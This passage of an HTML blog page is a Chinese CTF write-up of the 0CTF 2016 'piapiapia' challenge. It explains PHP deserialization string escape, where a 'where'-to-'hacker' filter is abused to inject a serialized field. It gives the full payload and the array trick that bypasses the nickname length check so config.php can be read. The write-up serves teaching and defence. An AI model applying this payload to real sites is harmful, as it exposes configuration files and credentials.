class="hljs-comment"></span><br></code></pre></td></tr></table></figure>
+
+<p>我们来观察一下 <code>fileter()</code> 替换的字符传有那些特点</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">将 <span class="hljs-keyword">select</span>, <span class="hljs-keyword">insert</span>, <span class="hljs-keyword">update</span>, <span class="hljs-keyword">delete</span>, <span class="hljs-keyword">where</span> 替换为  hacker<br>我们发现 <span class="hljs-keyword">select</span> <span class="hljs-keyword">insert</span> <span class="hljs-keyword">update</span> <span class="hljs-keyword">delete</span> hacker 字符串的长度都为 <span class="hljs-number">6</span>,所以当这些字符串被替换时,不会出现报错<br>但 <span class="hljs-keyword">where</span> 字符串长度只有<span class="hljs-number">5</span> 如果用 hacker 去替换,那肯定就会出问题, 我们现在就需要利用会出问题的 <span class="hljs-keyword">where</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/*由于每替换一次where就会多出来一个字符,我们就可以在where后面多加一位为字符</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">举个例子</span><br><span class="hljs-comment">$a = &#123;&#x27;nickname&#x27;=&gt;&#x27;wehre&quot;&#x27;,&#x27;phone&#x27;=&gt;&#x27;123&#x27;&#125;;</span><br><span class="hljs-comment">var_dump($a);</span><br><span class="hljs-comment">得到结果如下:</span><br><span class="hljs-comment">*/</span><br>a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&#x27;where&quot;&#x27;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;phone&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;&#125;<br><span class="hljs-comment">// 将 where替换为hacker </span><br>a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&#x27;hacker&quot;&#x27;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;phone&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;&#125;<br><span class="hljs-comment">// 由于 s:6  表示储存了 6为字符串 而 &#x27;hacker&#x27;刚好 6 位,于是此时的  &quot;  便逃逸了出来.</span><br><br><span class="hljs-comment">// 假设我现在需要覆盖 &quot;phone&quot;=&gt;&#x27;123&#x27;   将其变为&quot;iphone&quot;=&gt;&#x27;11&#x27;</span><br><span class="hljs-comment">// 由于 &quot;iphone&quot;=&gt;&#x27;1&#x27; 的序列化字符为 s:6:&quot;iphone&quot;;s:2:&quot;11&quot; 再加上闭合需要 &quot;; ;&#125;  一共有25 位字符,于是我们便需要 25 个where</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;nickname&#x27;</span>=&gt;<span class="hljs-string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:6:&quot;iphone&quot;;s:2:&quot;11&quot;;&#125;&#x27;</span>,<span class="hljs-string">&#x27;phone&#x27;</span>=&gt;<span class="hljs-string">&#x27;123&#x27;</span>);<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2021-07-16-0ctf2016piapiapia/image-20210717020955891.png" srcset="/img/loading.gif" lazyload alt="image-20210717020955891"></p>
+<p>可以看到我们更改了原来的<code>&#39;phone&#39;=&gt;&#39;123&#39;</code> 变为了 <code>&#39;iphone&#39;=&gt;&#39;11&#39;</code></p>
+<p>同样,这道题下需要我们更改 <code>photo</code>的值为<code>config.php</code></p>
+<p>所以我们需要构造序列化字符</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:10:&quot;</span>config.php<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>序列化字符长度为 33 ,所以我们一共下需要 33 个 where.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="hljs-string">&quot;;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:10:&quot;</span>config.php<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>不过这样构造之后  会发现 我们<code>nickname</code>的长度 &gt; 10, 不满足</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) || strlen(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) &gt; <span class="hljs-number">10</span>)<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid nickname&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>这里为了绕过 <code>strlen()</code>,便下需要将传入的参数<code>nickname</code>变为数组<code>nickname[]</code></p>
+<p>但同时需要对序列化字符作出一点修改以用于闭合数组的序列化格式,重新构造如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;;&#125;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:10:&quot;</span>config.php<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>序列化字符串数为 35 所以需要构造 35 个where</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="hljs-string">&quot;;&#125;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:10:&quot;</span>config.php<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2021-07-16-0ctf2016piapiapia/image-20210717023733994.png" srcset="/img/loading.gif" lazyload alt="image-20210717023733994"></p>
+<p><img src="/images/2021-07-16-0ctf2016piapiapia/image-20210717023752692.png" srcset="/img/loading.gif" lazyload alt="image-20210717023752692"></p>
+<p>f12 查看一下源码</p>
+<p><img src="/images/2021-07-16-0ctf2016piapiapia/image-20210717023830111.png" srcset="/img/loading.gif" lazyload alt="image-20210717023830111"></p>
+<p>将图示组字符串 base64 解码便能拿到 flag</p>
+<p><img src="/images/2021-07-16-0ctf2016piapiapia/image-20210717024020359.png" srcset="/img/loading.gif" lazyload alt="image-20210717024020359"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一道入門的反序列化题目,唯一难点可能代码较长,不过只要静下心来读一读还是挺简单的.</p>
+<p>其次便是反序列化逃逸姿势,如果一旦发现对序列化字符串进行了操作,便可以寻找一下是否存在类似于本题的利用.</p>
+<p>同时也给开发者了一个提醒,任何过滤应该在操作前进行,如果一旦对序列化字符串进行了操作,便可造成反序列化,威胁到业务安全.</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/g0udan/p/12216207.html">https://www.cnblogs.com/g0udan/p/12216207.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43622442/article/details/105751356">https://blog.csdn.net/qq_43622442/article/details/105751356</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">刷题记录</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/07/15/BJDCTF2020-Marklovescat/">
+                        <span class="hidden-mobile">变量覆盖思路技巧</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
